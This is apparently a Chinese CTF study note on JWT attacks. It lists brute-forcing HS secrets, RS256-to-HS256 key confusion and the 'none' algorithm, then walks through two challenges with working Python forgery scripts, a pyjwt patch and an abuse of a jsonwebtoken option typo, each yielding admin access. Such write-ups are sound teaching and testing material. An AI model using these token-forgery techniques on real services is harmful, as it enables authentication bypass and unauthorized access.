---
title: 【WEB】JWT
---

# JWT

JWT 的通常加密方式有 RS 和 HS 

将加密后的内容复制到 https://jwt.io/ 即可看到解密后的结果和加密方式

其中 RS 是需要需要公私钥的，HS 是对称加密



## 攻击方法

HS 可以使用 https://github.com/brendan-rius/c-jwt-cracker 工具进行爆破

RS 验证配置错误，公钥泄露

加密方式设置为 none



## 例题：

### HSCTF [Broken Tokens]

源码：

```
import jwt
import base64
import os
import hashlib
from flask import Flask, render_template, make_response, request, redirect
app = Flask(__name__)
FLAG = os.getenv("FLAG")
PASSWORD = os.getenv("PASSWORD")
with open("privatekey.pem", "r") as f:
	PRIVATE_KEY = f.read()
with open("publickey.pem", "r") as f:
	PUBLIC_KEY = f.read()

@app.route('/', methods=['GET', 'POST'])
def index():
	if request.method == "POST":
		resp = make_response(redirect("/"))
		if request.form["action"] == "Login":
			if request.form["username"] == "admin" and request.form["password"] == PASSWORD:
				auth = jwt.encode({"auth": "admin"}, PRIVATE_KEY, algorithm="RS256")
			else:
				auth = jwt.encode({"auth": "guest"}, PRIVATE_KEY, algorithm="RS256")
			resp.set_cookie("auth", auth)
		else:
			resp.delete_cookie("auth")
		
		return resp
	else:
		auth = request.cookies.get("auth")
		if auth is None:
			logged_in = False
			admin = False
		else:
			logged_in = True
			admin = jwt.decode(auth, PUBLIC_KEY)["auth"] == "admin"
		resp = make_response(
			render_template("index.html", logged_in=logged_in, admin=admin, flag=FLAG)
		)
	return resp

@app.route("/publickey.pem")
def public_key():
	with open("./publickey.pem", "r") as f:
		resp = make_response(f.read())
		resp.mimetype = 'text/plain'
		return resp

if __name__ == "__main__":
	app.run()
```

大致就是登录时验证的是私钥，然后登录后验证的是公钥，然后公钥可以通过 /publickey.pem 获取

先登录成 guest，这时 Token 是

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdXRoIjoiZ3Vlc3QifQ.e3UX6vGuTGHWouov4s5HuKn6B5zbe0ZjxwHCB_OQlX_TcntJuj89x0RDi8gQi88TMoXSFN-qnFUQxillB_nD5ErrVZKL8HI5Ah_iQBX1xfu097H2xT3LAhDEceq4HDEQY-iC4TVSxMGM0AS_ItsVLBIrxk8tapcANvCW_KnO3mEFwfQOD64YHtapSZJ-kKjdN19lgdI_g-2nNI83P6TlgLtZ8vo1BB1zt_8b4UECSiPb67YCsrCYIIsABq5UyxSwgUpZsM6oxW0k1c4NbaUTnUWURG2qWDVw56svRQETU3YjO59AMj67n9r9Y9NJ9FBlpHQ60Ck-mfL5JcmFE9sgVw
```

解密后信息部分是

```
{ "auth": "guest" }
```

然后再加密下

```
#!/usr/bin/env python
import jwt
import base64

with open("publickey.pem", "r") as f:
	PUBLIC_KEY = f.read()
print(jwt.encode({"auth":"admin"}, key=PUBLIC_KEY, algorithm='HS256'))
```

如果出错了就把报错地方注释掉 ( algorithms.py )

改成

```
def prepare_key(self, key):
        key = force_bytes(key)
        return key
```

原因是不能用公钥加密

```
flag{1n53cur3_tok3n5_5474212}
```



### HFCTF [EasyLogin]

在源码中可以发现 app.js，可以判断是 node.js

在备注中发现

```
或许该用 koa-static 来处理静态文件
路径该怎么配置？不管了先填个根目录XD
```

静态文件，根目录，那是不是可以直接访问

于是直接访问根目录下的 app.js，成功读取源码

根据 /static/js/app.js 中

```
function getflag() {
    $.get('/api/flag').done(function(data) {
        const {flag} = data;
        $("#username").val(flag);
    }).fail(function(xhr, textStatus, errorThrown) {
        alert(xhr.responseJSON.message);
    });
}
```

以及 /app.js 中

```
// add controllers:
app.use(controller());
```

还有 koa 框架的文件结构可知

```
app.js          入口文件
config          项目路由文件夹
models          对应的数据库表结构
DataBase        保存数据库封装的CRUD操作方法
controllers     项目控制器目录接受请求处理逻辑
```

访问 /controllers/api.js 可得到逻辑源码

代码中关键功能有：

获得 flag 的功能，SESSION[username] == admin 就能获得

```
'GET /api/flag': async (ctx, next) => {
    if(ctx.session.username !== 'admin'){
        throw new APIError('permission error', 'permission denied');
    }
    const flag = fs.readFileSync('/flag').toString();
    ctx.rest({
        flag
    });
    await next();
},
```

注册的功能，很明显这里不让注册用户名为 admin 的用户，同时会根据用户生成一个 JWT 口令

```
'POST /api/register': async (ctx, next) => {
    const {username, password} = ctx.request.body;
    if(!username || username === 'admin'){
        throw new APIError('register error', 'wrong username');
    }
    if(global.secrets.length > 100000) {
        global.secrets = [];
    }
    const secret = crypto.randomBytes(18).toString('hex');
    const secretid = global.secrets.length;
    global.secrets.push(secret)
    const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});
    ctx.rest({
        token: token
    });
    await next();
},
```

登录的功能

```
'POST /api/login': async (ctx, next) => {
    const {username, password} = ctx.request.body;
    if(!username || !password) {
        throw new APIError('login error', 'username or password is necessary');
    }
    const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;
    const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;
    console.log(sid)

    if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {
        throw new APIError('login error', 'no such secret id');
    }
    const secret = global.secrets[sid];
    const user = jwt.verify(token, secret, {algorithm: 'HS256'});
    const status = username === user.username && password === user.password;
    if(status) {
        ctx.session.username = username;
    }
    ctx.rest({
        status
    });
    await next();
},
```

这里识别用户身份的方法是，在注册时随机生成一个密钥，存入数组，并用它来加密 JWT 信息，JWT中储存着密钥的数组下标和用户名密码

（ JWT主要的功能是确认来源，防止伪造数据 ）

然后登录时解密第一部分，获得 JWT 中储存的信息，然后根据数组下标获得密钥，然后根据密钥解密数据，比对解密前后的用户名密码是否相同

这里存在的一个漏洞点是，在 JWT 的 jsonwebtoken 库中，接收的参数是 algorithms 而这里写的是 algorithm，这里跳过了验证

并且，当解密时没有密钥，同时加密方式为 none 的时候，会忽视后面的解密算法，按 none 方式解密

所以我们这里要把 JWT 信息解密后的数组下标替换成小数即可将密钥置空，之后就可以修改数值了

JWT 信息部分解密后为

```
{"secretid":4,"username":"111222","password":"111222"}
```

所以这里修改为

```
{"secretid":0.4,"username":"111222","password":"111222"}
```

之后通过脚本重新加密

```
import jwt

token = jwt.encode({"secretid":0.4,"username":"admin","password":"admin"},algorithm="none",key="").decode('utf-8')
print(token)
```

将 POST 数据包中的 authorization 内容替换即可以 admin 登录获取 flag